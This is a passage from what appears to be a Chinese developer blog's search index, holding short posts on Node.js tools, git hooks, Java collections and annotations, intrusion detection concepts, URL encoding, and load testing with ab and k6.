id="HTTP-2-Server-push-技术"><a href="#HTTP-2-Server-push-技术" class="headerlink" title="HTTP/2 Server push 技术"></a>HTTP/2 Server push 技术</h2>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nodejs 热重启工具</title>
      <link href="/nodejs/nodejs/nodemon/"/>
      <url>/nodejs/nodejs/nodemon/</url>
      
        <content type="html"><![CDATA[<p>在开发环境下，往往需要一个工具来自动重启项目工程，之前接触过 python 的 supervisor，现在写 node 的时候发现 supervisior 在很多地方都有他的身影，node 也有一个 npm 模块 supervisior 也是用来监控进程的，不过除了 supervisior 外，还有很多其他的工具，从 github 的评分上看。</p><h2 id="工具清单"><a href="#工具清单" class="headerlink" title="工具清单"></a>工具清单</h2><ul><li>nodemon</li><li>forever</li><li>node-dev</li><li>supervisior</li></ul><p>较常用的是 nodemon</p>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>基于服务端 store 模式的多用户实时协作方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/real-time/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/real-time/</url>
      
        <content type="html"><![CDATA[<h2 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h2><p>在很多系统中都有一些实时交互需求，例如 A 用户拖动一个图标，B 用户需要能实时感知。这对前后端开发都有较大的挑战，带来非常大的技术挑战。</p><p>另外也有一些基本的实时协作的需求，例如收到服务器的通知，然后展示出小红点。</p><h2 id="主要技术选型"><a href="#主要技术选型" class="headerlink" title="主要技术选型"></a>主要技术选型</h2><ul><li>store 模式前端简化交互</li><li>服务器 store 模式获得最终数据交互</li><li>通过 websocket 订阅 event 传送</li><li>通过 kafka 实现多播</li><li>通过 nodejs 作为后端同构语言，用于响应式编程</li><li>使用 MongoDB 作为文档数据库（取决于业务类型）</li><li>前后端使用同一事件处理代码</li></ul><h2 id="WebSocket-技术背景"><a href="#WebSocket-技术背景" class="headerlink" title="WebSocket 技术背景"></a>WebSocket 技术背景</h2>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>入侵检测系统</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/intrusion-detection/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/intrusion-detection/</url>
      
        <content type="html"><![CDATA[<h2 id="入侵检测系统（IDS）"><a href="#入侵检测系统（IDS）" class="headerlink" title="入侵检测系统（IDS）"></a>入侵检测系统（IDS）</h2><pre><code>IDS是计算机的监视系统，它通过实时监视系统，一旦发现异常情况就发出警告。 [1]  以信息来源的不同和检测方法的差异分为几类：根据信息来源可分为基于主机IDS和基于网络的IDS，根据检测方法又可分为异常入侵检测和误用入侵检测。不同于防火墙，IDS入侵检测系统是一个监听设备，没有跨接在任何链路上，无须网络流量流经它便可以工作。因此，对IDS的部署，唯一的要求是：IDS应当挂接在所有所关注流量都必须流经的链路上。在这里，&quot;所关注流量&quot;指的是来自高危网络区域的访问流量和需要进行统计、监视的网络报文。在如今的网络拓扑中，已经很难找到以前的HUB式的共享介质冲突域的网络，绝大部分的网络区域都已经全面升级到交换式的网络结构。因此，IDS在交换式网络中的位置一般选择在尽可能靠近攻击源或者尽可能靠近受保护资源的位置。这些位置通常是：服务器区域的交换机上；Internet接入路由器之后的第一台交换机上；重点保护网段的局域网交换机上。由于入侵检测系统的市场在近几年中飞速发展，许多公司投入到这一领域上来。Venustech(启明星辰）、Internet Security System（ISS）、思科、赛门铁克等公司都推出了自己的产品。</code></pre><h2 id="可用的开源方案-OSSEC"><a href="#可用的开源方案-OSSEC" class="headerlink" title="可用的开源方案 (OSSEC)"></a>可用的开源方案 (OSSEC)</h2><p>OSSEC是一款开源的多平台的入侵检测系统，可以运行于Windows, Linux, OpenBSD/FreeBSD,</p><p>以及 MacOS等操作系统中。主要功能有日志分析、完整性检查、rootkit检测、基于时间的警报和主动响应。</p><p>除了具有入侵检测系统功能外，它还一般被用在SEM/SIM（安全事件管理（SEM： Security Event Management）/</p><p>安全信息管理（SIM：SecurityInformation Management））解决方案中。因其强大的日志分析引擎，</p><p>ISP（Internet service provider）（网络服务提供商）、大学和数据中心用其监控和分析他们的防火墙、</p><p>入侵检测系统、网页服务和验证等产生的日志。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li>OSSEC 使用文档 <a href="https://www.ossec.net/docs/" target="_blank" rel="noopener">https://www.ossec.net/docs/</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Hibernate bean 验证器</title>
      <link href="/hibernate/hibernate/hibernate-validator/"/>
      <url>/hibernate/hibernate/hibernate-validator/</url>
      
        <content type="html"><![CDATA[<h2 id="JSR-380-Hibernate-validator"><a href="#JSR-380-Hibernate-validator" class="headerlink" title="JSR 380 Hibernate-validator"></a>JSR 380 Hibernate-validator</h2><p>Bean Validation 遵循 Bean Validation 2.0 规范，基于 JSR 380 实现。</p><p>常见的验证器有：</p><table><thead><tr><th>注解</th><th>作用</th></tr></thead><tbody><tr><td>@Valid</td><td>被注释的元素是一个对象，需要检查此对象的所有字段值</td></tr><tr><td>@Null</td><td>被注释的元素必须为 null</td></tr><tr><td>@NotNull</td><td>被注释的任何元素必须不为 null</td></tr><tr><td>@AssertTrue</td><td>被注释的元素必须为 true</td></tr><tr><td>@AssertFalse</td><td>被注释的元素必须为 false</td></tr><tr><td>@Min(value)</td><td>被注释的元素必须是一个数字，其值必须大于等于指定的最小值</td></tr><tr><td>@Max(value)</td><td>被注释的元素必须是一个数字，其值必须小于等于指定的最大值</td></tr><tr><td>@DecimalMin(value)</td><td>被注释的元素必须是一个数字，其值必须大于等于指定的最小值</td></tr><tr><td>@DecimalMax(value)</td><td>被注释的元素必须是一个数字，其值必须小于等于指定的最大值</td></tr><tr><td>@Negative</td><td>被注释的元素必须是一个负数</td></tr><tr><td>@NegativeOrZero</td><td>被注释的元素必须是负数或 0</td></tr><tr><td>@Positive</td><td>被注释的元素必须是一个正数</td></tr><tr><td>@PositiveOrZero</td><td>被注释的元素必须是一个正数或 0</td></tr><tr><td>@Size(max, min)</td><td>被注释的元素的大小必须在指定的范围内</td></tr><tr><td>@Digits (integer, fraction)</td><td>被注释的元素必须是一个数字，其值必须在可接受的范围内</td></tr><tr><td>@Past</td><td>被注释的元素必须是一个过去的日期</td></tr><tr><td>@PastOrPresent</td><td>被注释的元素必须是一个过去或当前的日期</td></tr><tr><td>@Future</td><td>被注释的元素必须是一个将来的日期</td></tr><tr><td>@FutureOrPresent</td><td>被注释的元素必须是一个将来或当前的日期</td></tr><tr><td>@Pattern(value)</td><td>被注释的元素必须符合指定的正则表达式</td></tr><tr><td>@NotEmpty</td><td>集合对象的元素不为0，即集合不为空，也可以用于字符串不为 null</td></tr><tr><td>@NotBlank</td><td>只能用于字符串不为null，并且字符串trim()以后length要大于0</td></tr><tr><td>@Email</td><td>被注释的元素必须是一个有效的邮箱地址</td></tr></tbody></table><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/y550918116j/article/details/78258916" target="_blank" rel="noopener">https://blog.csdn.net/y550918116j/article/details/78258916</a></li><li><a href="https://beanvalidation.org/" target="_blank" rel="noopener">https://beanvalidation.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> hibernate </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>URL 字符编码</title>
      <link href="/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/network/url-encode/"/>
      <url>/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/network/url-encode/</url>
      
        <content type="html"><![CDATA[<h2 id="URL-中需要编码的字符"><a href="#URL-中需要编码的字符" class="headerlink" title="URL 中需要编码的字符"></a>URL 中需要编码的字符</h2><table><thead><tr><th>字符</th><th>转义码</th><th>URL中用途</th><th></th></tr></thead><tbody><tr><td>+</td><td>%2B</td><td>URL 中+号表示空格</td><td></td></tr><tr><td>/</td><td>%2F</td><td>分隔目录和子目录</td><td></td></tr><tr><td>?</td><td>%3F</td><td>分隔实际的 URL 和参数</td><td></td></tr><tr><td>%</td><td>%25</td><td>指定特殊字符</td><td></td></tr><tr><td>#</td><td>%23</td><td>锚点</td><td></td></tr><tr><td>&amp;</td><td>%26</td><td>URL 中指定的参数间的分隔符</td><td></td></tr><tr><td>=</td><td>%3D</td><td>URL 中指定参数的值</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 网络通信 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用git钩子对提交代码进行检查</title>
      <link href="/git/git/git-hooks/"/>
      <url>/git/git/git-hooks/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>git hooks 是一些自定义的 shell 脚本，用于 git 提交某个生命周期中执行，用于控制 git 工作的流程，分为客户端钩子和服务。</p><p>客户端钩子：</p><ul><li><p>pre-commit</p></li><li><p>prepare-commit-msg</p></li><li><p>commit-msg</p></li><li><p>post-commit</p></li></ul><p>服务器端钩子：</p><ul><li><p>pre-receive</p></li><li><p>post-receive</p></li><li><p>update</p></li></ul><p>一般我们会通过配置<code>pre-commit</code> 到项目中，约束团队成员提交代码时候进行一些检查，例如：</p><ul><li>运行单元测试</li><li>运行代码检查，例如 checkstyle、eslint 等</li><li>提交的 commit 信息检查</li></ul><p>如果有 git 服务器配置权限，也可以通过配置 <code>pre-receive</code> 在服务器端运行检查。</p><h2 id="pre-commit"><a href="#pre-commit" class="headerlink" title="pre-commit"></a>pre-commit</h2><p>pre-commit 是一个比较常用的钩子，可以用于提交代码前执行。例如运行构建、测试或者质量检查等。</p><p><strong>Java Gradle 的一个 pre-commit 脚本</strong></p><pre><code class="shell">#!/bin/sh# From gist at https://gist.github.com/chadmaughan/5889802set -x# run the tests with the gradle wrapper./gradlew clean build# store the last exit code in a variableRESULT=$?# return the &#39;./gradlew build&#39; exit codeexit $RESULTs</code></pre><p>在项目的根目录中添加 <code>pre-commit</code> 文件，通过配置 <code>gradle</code> 脚本在项目初始话时安装该 <code>hook</code></p><pre><code class="groovy">task installGitHooks(type: Copy) {    from new File(rootProject.rootDir, &#39;pre-commit&#39;)    into {        new File(rootProject.rootDir, &#39;.git/hooks&#39;)    }    fileMode 0755}build.dependsOn installGitHooks</code></pre><p><strong>前端的一个 pre-commit 脚本</strong></p><pre><code class="shell">#!/bin/shSTAGE_FILES=$(git diff --cached --name-only --diff-filter=ACM -- &#39;*.vue&#39; &#39;*.js&#39;)set -xPASS=truefor FILE in $STAGE_FILESdo    ./node_modules/.bin/eslint $FILE    if [[ &quot;$?&quot; == 1 ]]; then        PASS=false    fidoneif ! $PASS; then  echo &quot;lint running failed！&quot;  exit 1</code></pre><p>同样的，将该 <code>pre-commit</code> 放到项目根目录中，通过 <code>npm postinstall</code> 钩子安装。</p><pre><code class="json">&quot;scripts&quot;: {  &quot;postinstall&quot;: &quot;cp pre-commit .git/hooks&quot;},</code></pre><h2 id="pre-receive"><a href="#pre-receive" class="headerlink" title="pre-receive"></a>pre-receive</h2><p>服务器上的 <code>hooks</code> 目录为 <code>.git/custom_hooks</code> 需要，注意是否授予当前服务具有可执行权限。</p><p>下面就是一个检查 <code>git commit</code> 信息的脚本：</p><pre><code class="sh">#!/bin/bashset -eo pipefailrefname=&quot;$0&quot;oldrev=&quot;$1&quot;newrev=&quot;$2&quot;echo &quot;Enforcing Policies...&quot;# Iterate over all the commitsfor commit in $(git rev-list 538c33..d14fc7); do  git cat-file commit &quot;${commit}&quot; | sed &#39;1,/^$/d&#39; | your-validatordone </code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p>官方文档 <a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2</a></p></li><li><p><a href="https://stackoverflow.com/questions/39419360/git-pre-receive-hook-to-check-commit-message" target="_blank" rel="noopener">https://stackoverflow.com/questions/39419360/git-pre-receive-hook-to-check-commit-message</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot API 文档方案</title>
      <link href="/Spring/spring/spring-rest-doc/"/>
      <url>/Spring/spring/spring-rest-doc/</url>
      
        <content type="html"><![CDATA[<h2 id="Swagger-restdocs-方案"><a href="#Swagger-restdocs-方案" class="headerlink" title="## Swagger + restdocs 方案"></a>## Swagger + restdocs 方案</h2><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li>restdocs 方案<a href="https://www.jianshu.com/p/d2e19861f1b2" target="_blank" rel="noopener">https://www.jianshu.com/p/d2e19861f1b2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>代码质量扫描</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/codescan/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/codescan/</url>
      
        <content type="html"><![CDATA[<h2 id="开源扫描"><a href="#开源扫描" class="headerlink" title="开源扫描"></a>开源扫描</h2><ul><li>foosid</li></ul><h2 id="代码质量扫描"><a href="#代码质量扫描" class="headerlink" title="代码质量扫描"></a>代码质量扫描</h2><p>### </p>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 集合</title>
      <link href="/java/java/java-collections/"/>
      <url>/java/java/java-collections/</url>
      
        <content type="html"><![CDATA[<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>java 中队列分为单项队列和双向队列</p><ul><li>单项队列 Queue 接口<ul><li>队列通常 FIFO （先进先出）</li><li>优先级队列和堆栈 LIFO （后进先出）</li></ul></li><li>双向队列 Deque (Double ended queue)<ul><li>是一种具有队列和栈性质的数据结构</li><li>可以两头操作</li></ul></li></ul><p>ArrayDeque 是通过数组实现的双向队列。ArrayDeque不是线程安全的。<br>ArrayDeque不可以存取null元素，因为系统根据某个位置是否为null来判断元素的存在。 当作为栈使用时，性能比Stack好；当作为队列使用时，性能比LinkedList好。 </p><p>常用的方法有:</p><h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><ul><li>addFirst(E e)在数组前面添加元素</li><li>addLast(E e)在数组后面添加元素</li><li>offerFirst(E e) 在数组前面添加元素，并返回是否添加成功</li><li>offerLast(E e) 在数组后天添加元素，并返回是否添加成功</li></ul><h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><p>removeFirst()删除第一个元素，并返回删除元素的值,如果元素为null，将抛出异常<br>pollFirst()删除第一个元素，并返回删除元素的值，如果元素为null，将返回null<br>removeLast()删除最后一个元素，并返回删除元素的值，如果为null，将抛出异常<br>pollLast()删除最后一个元素，并返回删除元素的值，如果为null，将返回null<br>removeFirstOccurrence(Object o) 删除第一次出现的指定元素<br>removeLastOccurrence(Object o) 删除最后一次出现的指定元素</p><h3 id="获取元素"><a href="#获取元素" class="headerlink" title="获取元素"></a>获取元素</h3><ul><li>getFirst() 获取第一个元素,如果没有将抛出异常</li><li>getLast() 获取最后一个元素，如果没有将抛出异常</li></ul><h3 id="队列操作"><a href="#队列操作" class="headerlink" title="队列操作"></a>队列操作</h3><ul><li>add(E e) 在队列尾部添加一个元素</li><li>offer(E e) 在队列尾部添加一个元素，并返回是否成功</li><li>remove() 删除队列中第一个元素，并返回该元素的值，如果元素为null，将抛出异常(其实底层调用的是removeFirst())</li><li>poll()  删除队列中第一个元素，并返回该元素的值,如果元素为null，将返回null(其实调用的是pollFirst())</li><li>element() 获取第一个元素，如果没有将抛出异常</li><li>peek() 获取第一个元素，如果返回null</li></ul><h3 id="栈操作"><a href="#栈操作" class="headerlink" title="栈操作"></a>栈操作</h3><ul><li>push(E e) 栈顶添加一个元素</li><li>pop(E e) 移除栈顶元素,如果栈顶没有元素将抛出异常</li></ul><h3 id="通用操作"><a href="#通用操作" class="headerlink" title="通用操作"></a>通用操作</h3><ul><li>size() 获取队列中元素个数</li><li>isEmpty() 判断队列是否为空</li><li>iterator() 迭代器，从前向后迭代</li><li>descendingIterator() 迭代器，从后向前迭代</li><li>contain(Object o) 判断队列中是否存在该元素</li><li>toArray() 转成数组</li><li>clear() 清空队列</li><li>clone() 克隆(复制)一个新的队列</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>ArrayDeque类的使用详解 <a href="https://blog.csdn.net/skh2015java/article/details/74840513" target="_blank" rel="noopener">https://blog.csdn.net/skh2015java/article/details/74840513</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 注解基础</title>
      <link href="/java/java/java-annotation/"/>
      <url>/java/java/java-annotation/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>注解是插到源代码中的标签，使用其他工具可以对其进行处理。例如  RequestMapping 这个注解的定义。Spring MVC 会使用 AOP 等机制在启动时对 RequestMapping 进行处理，添加到 RequestMap 列表中，响应用户请求。</p><pre><code>@Target({ElementType.METHOD, ElementType.TYPE})@Retention(RetentionPolicy.RUNTIME)@Documented@Mappingpublic @interface RequestMapping {}</code></pre><p>Java 提供了一些元注解，用于修饰自定义的注解。</p><ul><li>@Target 限制注解使用的位置</li><li>@Retention 注解保留的时间，RetentionPolicy.RUNTIME 会保留到运行时</li><li>@Document 生成的文档是否包含这个注解</li><li>@Inherited 使用在类上，是否运行子类继承这个注解</li></ul><p>另外注解上还可以使用其他注解，从而实现复合注解。复合注解是 Spring 提供的注解增强能力。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Web网站的几个并发量级</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/qps-level/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/qps-level/</url>
      
        <content type="html"><![CDATA[<p>50QPS以下——小网站</p><p>没什么好说的，简单的小网站而已，就如同本站这样，你可以用最简单的方法快速搭建，短期没有太多的技术瓶颈，只要服务器不要太烂就好。</p><p>50～100QPS——DB极限型</p><p>大部分的关系型数据库的每次请求大多都能控制在0.01秒左右，即便你的网站每页面只有一次DB请求，那么页面请求无法保证在1秒钟内完成100个请求，这个阶段要考虑做Cache或者多DB负载。无论那种方案，网站重构是不可避免的。</p><p>300～800QPS——带宽极限型</p><p>目前服务器大多用了IDC提供的“百兆带宽”，这意味着网站出口的实际带宽是8M Byte左右。假定每个页面只有10K Byte，在这个并发条件下，百兆带宽已经吃完。首要考虑是CDN加速／异地缓存，多机负载等技术。</p><p>500～1000QPS——内网带宽极限＋Memcache极限型</p><p>由于Key/value的特性，每个页面对memcache的请求远大于直接对DB的请求，Memcache的悲观并发数在2w左右，看似很高，但事实上大多数情况下，首先是有可能在次之前内网的带宽就已经吃光，接着是在8K QPS左右的情况下，Memcache已经表现出了不稳定，如果代码上没有足够的优化，可能直接将压力转嫁到了DB层上，这就最终导致整个系统在达到某个阀值之上，性能迅速下滑。</p><p>1000～2000QPS——FORK/SELECT，锁模式极限型</p><p>好吧，一句话：线程模型决定吞吐量。不管你系统中最常见的锁是什么锁，这个级别下，文件系统访问锁都成为了灾难。这就要求系统中不能存在中央节点，所有的数据都必须分布存储，数据需要分布处理。总之，关键词：分布</p><p>2000QPS以上——C10K极限</p><p>尽管现在很多应用已经实现了C25K，但短板理论告诉我们，决定网站整体并发的永远是最低效的那个环节。我承认我生涯中从未遇到过2000QPS以上，甚至1.5K以上的网站，希望有此经验的哥们可以一起交流下</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>Web网站的几个并发量级 <a href="https://www.cnblogs.com/yiwd/p/3711677.html" target="_blank" rel="noopener">https://www.cnblogs.com/yiwd/p/3711677.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 ab(apache benchmark) 进行压力测试</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/apache-benchmark/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/apache-benchmark/</url>
      
        <content type="html"><![CDATA[<p>Apache Benchmark 简称 ab 是 Apache web 服务器自带的性能测试工具，在 windows 或者 linux 上安装了 Apache 服务器就可以在其安装位置的 bin 目录中找到 ab 这个程序。</p><p>ab 使用起来非常简单，一般只需要 -n 参数指明发出请求的总数，以及 -c 参数指明测试期间的并发数。</p><p>例如对 thoughtworks 官网首页发出 100 个请求，模拟并发数为 10：</p><blockquote><p>ab -n 100 -c 10 <a href="https://thoughtworks.com/" target="_blank" rel="noopener">https://thoughtworks.com/</a></p></blockquote><p>需要注意的是 ab 工具接收一个 url 作为参数，仅仅是一个域名是不合法的，需要增加 <code>/</code> 表示首页。稍等片刻后就可以看到测试报告:</p><pre><code>Server Software:        nginx/1.15.6Server Hostname:        thoughtworks.comServer Port:            443SSL/TLS Protocol:       TLSv1.2,ECDHE-RSA-AES256-GCM-SHA384,2048,256Server Temp Key:        ECDH P-256 256 bitsTLS Server Name:        thoughtworks.comDocument Path:          /Document Length:        162 bytesConcurrency Level:      10Time taken for tests:   42.079 secondsComplete requests:      100Failed requests:        0Non-2xx responses:      100Total transferred:      42500 bytesHTML transferred:       16200 bytesRequests per second:    2.38 [#/sec] (mean)Time per request:       4207.888 [ms] (mean)Time per request:       420.789 [ms] (mean, across all concurrent requests)Transfer rate:          0.99 [Kbytes/sec] receivedConnection Times (ms)              min  mean[+/-sd] median   maxConnect:     1056 2474 3006.1   1144   23032Processing:   349  740 1003.5    379    8461Waiting:      349  461 290.9    377    2265Total:       1411 3214 3273.9   1674   23424Percentage of the requests served within a certain time (ms)  50%   1674  66%   2954  75%   3951  80%   4397  90%   6713  95%   9400  98%  14973  99%  23424 100%  23424 (longest request)</code></pre><p>从这个报告中可以看到服务器的一些基本信息，以及请求的统计信息。比较重要的指标是 <code>Requests per second</code> 每秒钟完成的请求数量，不严格的说也就是我们的平时说的 QPS。</p><p>ab 测试是专为 http 请求设计的，因此 ab 的其他参数和 curl 的参数比较类似，也可以指定 http method 以及 cookies 等参数。</p>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 k6 进行压力测试</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/performace-testing-k6/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/performace-testing-k6/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>k6 是一个压力测试套件，使用 golang 编写。主要特性有：</p><ul><li>提供了友好的 CLI  工具</li><li>使用 JavaScript 代码编写测试用例</li><li>可以根据性能条件设置阈值，表明成功还是失败</li></ul><p>k6 没有使用 nodejs 而是 golang 程序，通过包裹了一个 JavaScript 运行时来运行 JavaScript 脚本，因此不能直接使用 npm 包以及 Nodejs 提供的一些 API。</p><p>同时，k6 在运行测试时，没有启动浏览器，主要用于测试页面以及 API 加载速度。k6 提供了通过网络请求（HAR）生成测试脚本的方法，实现更简便的测试脚本编写，以及 session 的维护。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在 Mac 上比较简单，直接使用 HomeBrew 即可安装：</p><blockquote><p>brew install k6</p></blockquote><p>其他平台官网也提供了相应的安装方式，比较特别的是提供了 Docker 的方式运行。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>直接使用 k6 的命令运行测试，官网提供了一个例子：</p><blockquote><p>k6 run github.com/loadimpact/k6/samples/http_get.js</p></blockquote><p>也可以编写自己的测试脚本:</p><pre><code>import http from &quot;k6/http&quot;;import { sleep } from &quot;k6&quot;;export default function() {  http.get(&quot;https://www.thoughtworks.com&quot;);  sleep(1);};</code></pre><p>保存文件 script.js 后运行 k6 命令</p><blockquote><p>k6 run script.js</p></blockquote><p>然后可以看到 http 请求的各项指标</p><pre><code>        /\      |‾‾|  /‾‾/  /‾/        /\  /  \     |  |_/  /  / /        /  \/    \    |      |  /  ‾‾\     /          \   |  |‾\  \ | (_) |   / __________ \  |__|  \__\ \___/ .io  execution: local     output: -     script: k6.js    duration: -,  iterations: 1         vus: 1, max: 1    done [==========================================================] 1 / 1    data_received..............: 108 kB 27 kB/s    data_sent..................: 1.0 kB 252 B/s    http_req_blocked...........: avg=2.35s    min=2.35s    med=2.35s    max=2.35s    p(90)=2.35s    p(95)=2.35s       http_req_connecting........: avg=79.18ms  min=79.18ms  med=79.18ms  max=79.18ms  p(90)=79.18ms  p(95)=79.18ms     http_req_duration..........: avg=639.03ms min=639.03ms med=639.03ms max=639.03ms p(90)=639.03ms p(95)=639.03ms    http_req_receiving.........: avg=358.12ms min=358.12ms med=358.12ms max=358.12ms p(90)=358.12ms p(95)=358.12ms    http_req_sending...........: avg=1.79ms   min=1.79ms   med=1.79ms   max=1.79ms   p(90)=1.79ms   p(95)=1.79ms      http_req_tls_handshaking...: avg=701.46ms min=701.46ms med=701.46ms max=701.46ms p(90)=701.46ms p(95)=701.46ms    http_req_waiting...........: avg=279.12ms min=279.12ms med=279.12ms max=279.12ms p(90)=279.12ms p(95)=279.12ms    http_reqs..................: 1      0.249921/s    iteration_duration.........: avg=4s       min=4s       med=4s       max=4s       p(90)=4s       p(95)=4s          iterations.................: 1      0.249921/s    vus........................: 1      min=1 max=1    vus_max....................: 1      min=1 max=1</code></pre><p>运行压力测试时，需要增加更多的虚拟用户（VU），vus 参数和持续时间的参数:</p><blockquote><p>k6 run –vus 10 –duration 30s script.js</p></blockquote><h2 id="编写测试脚本的一些规则"><a href="#编写测试脚本的一些规则" class="headerlink" title="编写测试脚本的一些规则"></a>编写测试脚本的一些规则</h2><p><code>default</code> 方法是用于给每个 VU 以及每次迭代重复运行的，因此需要把真正的测试代码放到这个方法中，例如访问某个页面。</p><p>为了保证测试的准确性，一些初始化的代码不应该放到 <code>default</code> 方法中。尤其是文件的读取等依赖环境上下文的操作不能放到 <code>default</code> 方法中执行，这样做也会丢失 k6 分布式运行的能力。</p><p>前面提到的命令行参数，例如指定虚拟用户数量 <code>--vus 10</code>，这些参数也可以放到脚本代码中。通过暴露一个 options 对象即可。</p><pre><code>export let options = {  vus: 10,  duration: &quot;30s&quot;};</code></pre><p>为了更为真实的模拟用户访问的场景，k6 提供了在整个测试期间让用户数量和访问时间呈阶段性变化的能力。只需要在 options 中增加 stages 参数即可：</p><pre><code>export let options = { stages: [    { duration: &quot;30s&quot;, target: 20 },    { duration: &quot;1m30s&quot;, target: 10  },    { duration: &quot;20s&quot;, target: 0 },  ]};</code></pre><p>在测试过程中需要检查网络请求是否成功，返回的状态码是否正确，以及响应时间是否符合某个阈值。在脚本中可以通过调用 check() 方法编写检查语句，以便 k6 能收集到报告。</p><pre><code>import http from &quot;k6/http&quot;;import { check, sleep } from &quot;k6&quot;;export let options = {  vus: 10,  duration: &quot;30s&quot;};export default function() {  let res = http.get(&quot;http://test.loadimpact.com&quot;);  check(res, {    &quot;status was 200&quot;: (r) =&gt; r.status == 200,    &quot;transaction time OK&quot;: (r) =&gt; r.timings.duration &lt; 200  });  sleep(1);};</code></pre><h2 id="报告输出"><a href="#报告输出" class="headerlink" title="报告输出"></a>报告输出</h2><p>k6 默认将报告输出到 stdout 控制台，同时也提供了多种格式报告输出，包括：</p><ul><li>JSON</li><li>CSV</li><li>InfluxDB</li><li>Apache Kafka</li><li>StatsD</li><li>Datadog</li><li>Load Impact cloud platform</li></ul><p>当然，我们在编写测试的时候不可能只有一个用例，对多个场景可以在脚本中通过 <code>group</code> 进行分组，分组后输出的报告会按照分组排列。同时，也可以使用对一个组整体性能衡量的指标 <code>group_duration</code>。</p><pre><code>import { group } from &quot;k6&quot;;export default function() {  group(&quot;user flow: returning user&quot;, function() {    group(&quot;visit homepage&quot;, function() {      // load homepage resources    });    group(&quot;login&quot;, function() {      // perform login    });  });};</code></pre><p>InfluxDB 等外部数据收集平台时，还可以打上标签，供过滤和检索使用。k6 提供了一些内置的标签，并允许用户自定义标签。</p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>官方文档 <a href="https://docs.k6.io/docs" target="_blank" rel="noopener">https://docs.k6.io/docs</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux 下字体安装</title>
      <link href="/linux/linux/linux-font/"/>
      <url>/linux/linux/linux-font/</url>
      
